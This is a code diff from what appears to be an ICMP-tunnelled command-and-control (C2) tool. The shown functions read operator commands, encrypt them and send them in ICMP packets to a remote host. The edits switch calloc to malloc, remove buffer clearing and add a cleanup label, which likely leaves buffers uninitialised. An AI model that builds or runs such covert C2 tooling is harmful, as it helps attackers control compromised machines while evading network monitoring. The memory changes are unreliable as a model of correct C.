@@ -58,7 +58,7 @@ unsigned short cksum(unsigned short *addr, int len) {
 
 // get the input and return it's buffer
 unsigned char *get_command(char *input) {
-    unsigned char *cipher_text = (unsigned char *) calloc(BUFFER_SIZE, 1);
+    unsigned char *cipher_text = (unsigned char *) malloc(BUFFER_SIZE);
 
     write(1, "> ", 2);
     fgets(input, BUFFER_SIZE, stdin);
@@ -145,7 +145,7 @@ void interact(int sockfd) {
     struct sockaddr_in addr; // holds the IP address
     unsigned char *packet; // holds the ICMP packet
     unsigned char *data; // holds the ICMP packet's data section
-    unsigned char *cipher_text = calloc(BUFFER_SIZE, 1);
+    unsigned char *cipher_text = malloc(BUFFER_SIZE);
     unsigned char *command;
     char *input; // holds the input buffer
     char src_ip[INET_ADDRSTRLEN]; // buffer to store the source IP (16 bytes)
@@ -168,9 +168,11 @@ void interact(int sockfd) {
         if ((nbytes_tmp = read_from_socket(sockfd, packet, packet_size) < 0)) {
             break;
         }
+
         if (nbytes_tmp != 0) {
             nbytes = nbytes_tmp;
         }
+
         ip = (struct iphdr *) packet;
         icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
 
@@ -188,16 +190,12 @@ void interact(int sockfd) {
 
             append_to_data_section(icmp, data, command);
 
-            data = NULL;
-
             nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
             if (nbytes < 0) {
                 perror("sendto()");
-                break;
+                goto cleanup;
             }
 
-            memset(input, 0, strlen(input));
-            memset(packet, 0, packet_size);
             break;
         }
     }
@@ -229,25 +227,19 @@ void interact(int sockfd) {
 
             append_to_data_section(icmp, data, command);
 
-            data = NULL;
-
             // we're using a stream cipher, and since length of input == cipher_text then we use strlen(input) instead
             nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
             if (nbytes < 0) {
                 perror("sendto()");
                 break;
             }
-
-            // clean up the packet buffer for the next usage
-            memset(packet, 0, packet_size);
-            memset(cipher_text, 0, BUFFER_SIZE);
-            memset(input, 0, strlen(input));
         }
     }
     
-    free(input);
-    free(cipher_text);
-    free(packet);
+    cleanup:
+        free(input);
+        free(cipher_text);
+        free(packet);
 }
 
 // initializes the options and starts the c2
